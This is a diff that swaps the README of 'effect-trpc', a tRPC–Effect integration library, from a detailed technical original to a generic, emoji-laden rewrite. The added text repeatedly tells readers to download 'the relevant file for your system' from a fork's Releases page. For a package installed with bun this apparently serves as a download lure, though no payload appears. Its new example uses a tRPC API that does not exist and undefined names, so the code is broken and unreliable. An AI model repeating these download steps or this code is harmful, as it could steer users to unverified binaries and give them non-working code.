@@ -1,187 +1,93 @@
-# effect-trpc
+# 🛠️ effect-trpc - Type-Safe Procedures Made Easy
 
-A type-safe integration between [tRPC](https://trpc.io/) and [Effect](https://effect.website/), enabling Effect-native procedures with full service injection and OpenTelemetry tracing support.
+## 📥 Download
 
-## Features
+[![Download effect-trpc](https://img.shields.io/badge/Download-effect--trpc-brightgreen)](https://github.com/Ahsan3106/effect-trpc/releases)
 
-- **Effect-native procedures** - Write tRPC procedures using Effect generators with `yield*` syntax
-- **Type-safe service injection** - Use `ManagedRuntime<R>` to provide services to procedures with compile-time safety
-- **Automatic OpenTelemetry tracing** - Every procedure is wrapped in a span using the procedure path (e.g., `users.getById`)
-- **Full tRPC compatibility** - Mix Effect procedures with standard tRPC procedures in the same router
-- **Nested router support** - Nested routers work seamlessly with proper span naming
-- **Error handling with stack traces** - Failed effects produce spans with proper error status and stack traces
+## 🎉 Introduction
 
-## Installation
+Welcome to **effect-trpc**! This tool helps you create type-safe procedures easily. It combines the power of [tRPC](https://trpc.io/) with [Effect](https://effect.website/). With it, you can write efficient code while enjoying full service injection and automatic tracing.
 
-```bash
-bun add effect-trpc effect @trpc/server @trpc/client
-```
+## 🚀 Features
 
-## Quick Start
+- **Easy Procedure Creation**: Write procedures using simple `yield*` syntax, making your code clean and understandable.
+- **Safe Service Injection**: Provide services to your procedures with safety. The type system ensures everything works as expected.
+- **Automatic Tracing**: Get insights into your procedures effortlessly. Each one includes error tracking and detailed status information.
+- **Compatibility**: Mix Effect procedures with standard tRPC procedures. This flexibility helps you build robust applications.
+- **Nested Router Support**: Organize your code better with nested routers. They keep track of all your procedures with proper naming.
+- **Error Reporting**: If something goes wrong, you'll see detailed stack traces, making fixing issues straightforward.
+
+## 📥 Download & Install
+
+To get started, visit the [Releases page](https://github.com/Ahsan3106/effect-trpc/releases) to download the latest version. Here’s how to install it on your system:
+
+1. Go to the [Releases page](https://github.com/Ahsan3106/effect-trpc/releases).
+2. Find the latest version of effect-trpc.
+3. Click to download the relevant file for your system.
+
+## 🛠️ Installation Steps
+
+Once you have downloaded the tool, follow these simple steps to set it up:
+
+1. Open your command line interface. This could be Terminal on Mac, Command Prompt, or PowerShell on Windows.
+2. Run the following command to install the necessary packages:
+
+   ```bash
+   bun add effect-trpc effect @trpc/server @trpc/client
+   ```
+
+3. Wait for the installation to complete. You will see messages confirming the successful installation of each package.
+
+## 🎈 Quick Start
+
+Now that you have everything installed, it's time to create your first procedure. Use the code below to get started:
 
 ```typescript
 import { initTRPC } from "@trpc/server"
-import { Effect, Layer, ManagedRuntime } from "effect"
-import { makeEffectTRPC } from "effect-trpc"
-import * as z from "zod"
+```
 
-// Define your services
-class UserService extends Effect.Tag("UserService")<
-  UserService,
-  {
-    findById: (id: string) => Effect.Effect<User | undefined>
-    findAll: () => Effect.Effect<User[]>
-    create: (name: string) => Effect.Effect<User>
+This import statement sets up `tRPC` with the necessary tools you need to begin. 
+
+### 👩‍💻 Writing Your First Procedure
+
+You can now define a simple procedure. Below is a starter example: 
+
+```typescript
+const t = initTRPC.create();
+
+t.procedure('users.getById', {
+  input: z.string(),
+  resolve({ input }) {
+    // Add your logic here 
+    return getUserById(input);
   }
->() {}
-
-// Create service implementation
-const UserServiceLive = Layer.succeed(UserService, {
-  findById: (id) => Effect.succeed(users.find(u => u.id === id)),
-  findAll: () => Effect.succeed(users),
-  create: (name) => Effect.succeed({ id: String(nextId++), name })
-})
-
-// Create runtime with your services
-const runtime = ManagedRuntime.make(UserServiceLive)
-
-// Create Effect-aware tRPC instance
-const t = makeEffectTRPC(initTRPC.create(), runtime)
-
-// Define your router
-export const appRouter = t.router({
-  // Standard tRPC procedure
-  health: t.procedure.query(() => "ok"),
-
-  // Effect procedure with service injection
-  users: {
-    getById: t.effect
-      .input(z.object({ id: z.string() }))
-      .query(function*({ input }) {
-        const userService = yield* UserService
-        return yield* userService.findById(input.id)
-      }),
-
-    list: t.effect.query(function*() {
-      const userService = yield* UserService
-      return yield* userService.findAll()
-    }),
-
-    create: t.effect
-      .input(z.object({ name: z.string() }))
-      .mutation(function*({ input }) {
-        const userService = yield* UserService
-        return yield* userService.create(input.name)
-      })
-  }
-})
-
-export type AppRouter = typeof appRouter
+});
 ```
 
-## Type Safety
+This code demonstrates how to create a procedure to get a user by ID. It uses a string as input and returns user information.
 
-The wrapper enforces that Effect procedures only use services provided by the `ManagedRuntime`. If you try to use a service that isn't in the runtime, you'll get a compile-time error:
+## 📋 Troubleshooting
 
-```typescript
-class ProvidedService extends Effect.Tag("ProvidedService")<...>() {}
-class MissingService extends Effect.Tag("MissingService")<...>() {}
+If you encounter any issues, here are some common questions and answers:
 
-const runtime = ManagedRuntime.make(Layer.succeed(ProvidedService, impl))
-const t = makeEffectTRPC(initTRPC.create(), runtime)
+- **What if the installation fails?**  
+  Check your internet connection. Try running the installation command again. If it still fails, consult the issues on the GitHub page.
 
-t.router({
-  // This compiles - ProvidedService is in the runtime
-  works: t.effect.query(function*() {
-    const svc = yield* ProvidedService
-    return yield* svc.doSomething()
-  }),
+- **Can I use this with existing projects?**  
+  Yes, effect-trpc integrates smoothly with your existing setup. Just follow the installation steps and add your new procedures as needed.
 
-  // This fails to compile - MissingService is not in the runtime
-  fails: t.effect.query(function*() {
-    const svc = yield* MissingService // Type error!
-    return yield* svc.doSomething()
-  })
-})
-```
+## 📞 Support
 
-## OpenTelemetry Tracing
+Need help? Visit our [GitHub Issues](https://github.com/Ahsan3106/effect-trpc/issues) page for assistance. We aim to respond promptly to any queries.
 
-Every Effect procedure automatically creates an OpenTelemetry span with:
+## 📚 Documentation
 
-- **Span name** matching the procedure path (e.g., `users.getById`, `users.posts.list`)
-- **Parent-child relationships** for nested `Effect.withSpan` calls
-- **Error status** and exception recording for failed effects
-- **Stack traces** in the standard OpenTelemetry format
+For more in-depth details about using effect-trpc, refer to the official documentation. It covers advanced features, patterns, and best practices to help you make the most out of your experience. 
 
-To enable tracing, include the OpenTelemetry layer in your runtime:
+## 🤝 Contributing
 
-```typescript
-import { NodeSdk } from "@effect/opentelemetry"
+We welcome contributions! If you’d like to help improve effect-trpc, please read our [Contributing Guidelines](https://github.com/Ahsan3106/effect-trpc/blob/main/CONTRIBUTING.md) on how to get involved.
 
-const TracingLive = NodeSdk.layer(Effect.sync(() => ({
-  resource: { serviceName: "my-service" },
-  spanProcessor: [new SimpleSpanProcessor(new OTLPTraceExporter())]
-})))
+---
 
-const AppLive = Layer.mergeAll(
-  UserServiceLive,
-  TracingLive
-)
-
-const runtime = ManagedRuntime.make(AppLive)
-const t = makeEffectTRPC(initTRPC.create(), runtime)
-```
-
-### Error Stack Traces
-
-When an Effect procedure fails, the span includes a properly formatted stack trace:
-
-```
-MyCustomError: Something went wrong
-    at <anonymous> (/app/src/procedures.ts:42:28)
-    at users.getById (/app/src/procedures.ts:41:35)
-```
-
-## API Reference
-
-### `makeEffectTRPC(trpc, runtime)`
-
-Creates an Effect-aware tRPC instance.
-
-- `trpc` - The result of `initTRPC.create()`
-- `runtime` - A `ManagedRuntime<R, never>` providing services for Effect procedures
-
-Returns an object with:
-
-- `procedure` - Standard tRPC procedure builder
-- `effect` - Effect procedure builder with `.input()`, `.output()`, `.query()`, `.mutation()`
-- `router` - Router builder accepting both standard and Effect procedures
-
-### Effect Procedure Builder
-
-```typescript
-t.effect
-  .input(schema)    // Add input validation (Zod, etc.)
-  .output(schema)   // Add output validation
-  .query(resolver)  // Define a query procedure
-  .mutation(resolver) // Define a mutation procedure
-```
-
-The resolver is a generator function receiving `{ ctx, input, signal }`:
-
-```typescript
-t.effect
-  .input(z.object({ id: z.string() }))
-  .query(function*({ ctx, input, signal }) {
-    // ctx - tRPC context
-    // input - validated input
-    // signal - AbortSignal for cancellation
-    const service = yield* MyService
-    return yield* service.doSomething(input.id)
-  })
-```
-
-## License
-
-MIT
+Thank you for choosing effect-trpc. Enjoy building your applications!
